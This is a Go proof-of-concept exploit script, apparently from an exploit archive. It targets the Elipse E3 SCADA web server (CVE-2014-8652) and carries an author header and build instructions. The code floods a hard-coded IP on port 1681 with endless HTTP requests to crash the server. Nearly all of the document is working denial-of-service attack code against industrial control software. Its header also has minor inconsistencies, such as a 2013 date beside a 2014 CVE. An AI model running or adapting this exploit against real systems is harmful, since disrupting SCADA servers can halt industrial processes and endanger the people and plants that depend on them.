// Exploit Http DoS Request for SCADA ATTACK Elipse 3
// Mauro Risonho de Paula Assumpç aka firebits
// mauro.risonho@gmail.com
// 29-10-2013 11:42
// Vendor Homepage: http://www.elipse.com.br/port/index.aspx
// Software Link: http://www.elipse.com.br/port/e3.aspx
// Version: 3.x and prior
// Tested on: windows
// CVE : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8652
// NVD : https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8652
// Hard lock Dll crash in Windows 2003 SP2 + 20 requests connections
// exploit in Golang (golang.com) C Google
// compile and execute:
// go build Exploit-Http-DoS-Request-for-SCADA-ATTACK-Elipse3-PoC.go
// chmod +x Exploit-Http-DoS-Request-for-SCADA-ATTACK-Elipse3-PoC.go
// ./Exploit-Http-DoS-Request-for-SCADA-ATTACK-Elipse3-PoC.go
 
package main
 
import (
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
)
 
func main() {
    count := 1
//  fmt.Println ("")
//  fmt.Println ("   _____.__              ___.   .__  __           ")
//  fmt.Println (" _/ ____\__|______   ____\_ |__ |__|/  |_  ______ ")
//  fmt.Println (" \   __\|  \_  __ \_/ __ \| __ \|  \   __\/  ___/ ")
//  fmt.Println (" |  |  |  ||  | \/\  ___/| \_\ \  ||  |  \___ \  ")
//  fmt.Println (" |__|  |__||__|    \___  >___  /__||__| /____  > ")
//  fmt.Println ("                       \/    \/              \/  ")
//  fmt.Println ("                   bits on fire. ")
    fmt.Println ("Exploit Http DoS Request for SCADA ATTACK Elipse 3")
    fmt.Println ("Mauro Risonho de Paula Assumpç aka firebits")
    fmt.Println ("29-10-2013 11:42")
    fmt.Println ("mauro.risonho@gmail.com")
    fmt.Println ("Hard lock Dll crash in Windows 2003 SP2 + ")
    fmt.Println ("20 requests connections per second")
 
    for {
        count += count
        //http://192.168.0.1:1681/index.html -> Elipse 3 http://<ip-elipse4><port listen: default 1681>
 
        fmt.Println ("Exploit Http DoS Request for SCADA ATTACK Elipse 3")
        fmt.Println ("Mauro Risonho de Paula Assumpç aka firebits")
        fmt.Println ("29-10-2013 11:42")
        fmt.Println ("mauro.risonho@gmail.com")
        fmt.Println ("Hard lock Dll crash in Windows 2003 SP2 + ")
        fmt.Println ("20 requests connections")
 
        fmt.Println ("Connected Port 1681...Testing")
        fmt.Println ("Counter Loops: ", count)
 
        res, err := http.Get("http://192.168.0.1:1681/index.html")
        if err != nil {
            log.Fatal(err)
        }
            robots, err := ioutil.ReadAll(res.Body)
            res.Body.Close()
            if err != nil {
            log.Fatal(err)
        }
        fmt.Printf("%s", robots)
    }
}
